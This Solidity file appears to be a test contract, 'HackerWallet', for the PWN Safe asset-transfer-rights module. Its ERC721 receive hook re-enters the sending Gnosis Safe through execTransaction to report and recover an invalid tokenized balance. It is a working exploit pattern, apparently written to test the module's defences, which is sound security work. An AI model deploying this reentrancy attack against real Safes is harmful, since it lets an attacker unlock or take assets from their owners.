// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/utils/introspection/IERC165.sol";

import "@safe/GnosisSafe.sol";

import "@pwn-safe/module/AssetTransferRights.sol";


contract HackerWallet is IERC165, IERC721Receiver {

	address public atr;
	uint256 public atrId;

	constructor() {

	}


	function setupHack(address _atr, uint256 _atrId) external {
		atr = _atr;
		atrId = _atrId;
	}

	function onERC721Received(
        address /*operator*/,
        address from,
        uint256 /*_tokenId*/,
        bytes calldata /*data*/
    ) external returns (bytes4) {
    	GnosisSafe(payable(from)).execTransaction(
			address(atr), 0,
			abi.encodeWithSignature("reportInvalidTokenizedBalance(uint256)", atrId),
			Enum.Operation.Call, 0, 0, 0, address(0), payable(0),
			abi.encodePacked(uint256(uint160(address(this))), bytes32(0), uint8(1))
		);

		GnosisSafe(payable(from)).execTransaction(
			address(atr), 0,
			abi.encodeWithSignature("recoverInvalidTokenizedBalance()"),
			Enum.Operation.Call, 0, 0, 0, address(0), payable(0),
			abi.encodePacked(uint256(uint160(address(this))), bytes32(0), uint8(1))
		);

		return IERC721Receiver.onERC721Received.selector;
    }

	function supportsInterface(bytes4 interfaceId) public pure returns (bool) {
		return interfaceId == type(IERC165).interfaceId
			|| interfaceId == type(IERC721Receiver).interfaceId;
	}

}
